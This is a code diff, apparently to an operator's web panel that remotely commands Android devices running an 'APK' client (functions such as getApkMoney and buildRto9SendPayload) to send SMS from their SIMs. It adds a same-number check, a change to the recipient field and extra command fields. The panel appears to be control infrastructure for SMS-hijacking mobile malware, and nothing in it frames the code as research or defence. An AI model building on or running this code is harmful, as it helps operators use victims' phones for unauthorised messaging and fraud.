@@ -568,12 +568,32 @@ function getDeviceSmsPhone(d,simSlot){
   if(digits.length===10)return'+91'+digits;
   return clean||digits;
 }
+function phoneDigits10(raw){
+  var c=String(raw||'').replace(/\D/g,'');
+  if(c.length>=10)return c.slice(-10);
+  return c;
+}
+function isSameNumberAsDevice(d,toRaw){
+  if(!d||!toRaw)return false;
+  var to10=phoneDigits10(formatApkSmsTo(toRaw)||toRaw);
+  if(!to10||to10.length<10)return false;
+  var raw=getRawDev(d.id);
+  var candidates=[d.displayPhone,getApkMobNo(raw,d),getApkSimPhone(raw,1),getApkSimPhone(raw,2),raw&&raw.mobNo,raw&&raw.phoneNumber,raw&&raw.phone];
+  if(raw&&raw.sims&&raw.sims.length){
+    raw.sims.forEach(function(s){if(s&&s.phoneNumber)candidates.push(s.phoneNumber);});
+  }
+  for(var i=0;i<candidates.length;i++){
+    if(!candidates[i])continue;
+    if(phoneDigits10(candidates[i])===to10)return true;
+  }
+  return false;
+}
 function fillDeviceSmsTo(d,force,simSlot){
   var toEl=document.getElementById('smsTo');
   if(!toEl||!d)return;
   if(!force&&toEl.value&&String(toEl.value).trim())return;
-  var phone=getDeviceSmsPhone(d,simSlot||_sendSimSlot);
-  if(phone)toEl.value=phone;
+  toEl.value='';
+  toEl.placeholder='Recipient number (10 digit) — device ka apna number mat daalo';
 }
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
 function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
@@ -2462,8 +2482,12 @@ function sendDeviceSms(sim){
   }
   var phoneDial=formatApkSmsTo(toRaw||to);
   var msg=(msgEl&&msgEl.value||'').trim();
-  if(!toRaw){toast('Device ka phone number nahi mila — number daalo',false);return;}
+  if(!toRaw){toast('Recipient number daalo — jis number par SMS bhejna hai',false);return;}
   if(!msg){toast('Enter message',false);return;}
+  if(isSameNumberAsDevice(d,toRaw)){
+    toast('Yeh selected device ka apna number hai — same number par SMS nahi jaata. Doosra ONLINE device select karke '+formatApkSmsTo(toRaw)+' par bhejo.',false);
+    return;
+  }
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
   toast('Sending SMS…',true);
@@ -3223,12 +3247,12 @@ function buildNyaApkCommandPatch(deviceId,sim,to,message){
   var to91=formatApkSmsTo(to);
   var slot=Math.max(0,(sim||1)-1);
   return{
-    command:'send message',messageText:message,msg:message,
+    cmd:'send_sms',command:'send message',messageText:message,msg:message,
     phoneNumber:to91,phone:to91,number:to91,to:to91,
     targetDeviceId:deviceId,simSlot:String(slot),sim:slot,
     sendSms:{message:message,status:'pending',to:to91},
     sms:{message:message,status:'pending',to:to91},
-    type:'sms',timestamp:Date.now()
+    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms'
   };
 }
 function buildRto9SendPayload(deviceId,sim,to,message){
@@ -3486,6 +3510,10 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var phoneFull=String(to||'').trim();
   var phoneDial=formatApkSmsTo(phoneFull||to);
   if(!phoneDial||phoneDial.length<12){if(callback)callback(false,{error:'Valid phone number daalo'});return;}
+  if(isSameNumberAsDevice(d,phoneFull||phoneDial)){
+    if(callback)callback(false,{error:'Selected device ka apna number hai — doosra online device select karke bhejo'});
+    return;
+  }
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var dual=needsDualSmsSend(inst,d);
   var writeNode=d.deviceNode||getDeviceProfilePath(d)||'clients';
